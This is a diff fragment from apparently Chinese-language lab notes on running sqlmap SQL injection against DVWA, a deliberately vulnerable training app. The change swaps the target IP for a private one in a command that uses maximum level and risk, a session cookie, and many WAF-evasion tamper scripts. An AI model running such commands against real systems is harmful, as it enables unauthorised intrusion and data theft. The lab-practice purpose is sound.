@@ -423,7 +423,7 @@ sqlmap got a 302 redirect to 'http://120.114.140.30:80/DVWA/login.php'. Do you w
 	- `--tamper`：要加入腳本測試篡改資料
 	- `--flush-session`：因為測試腳本會有cache的問題，因此需要刷新測試
 ```Bash
-$ python sqlmap.py -u "http://120.114.140.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=ikv86pst3juaqapnlncss7vk42" --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --flush-session
+$ python sqlmap.py -u "http://192.168.10.66/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=ikv86pst3juaqapnlncss7vk42" --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --flush-session
         ___
        __H__
  ___ ___[,]_____ ___ ___  {1.2.4.18#dev}
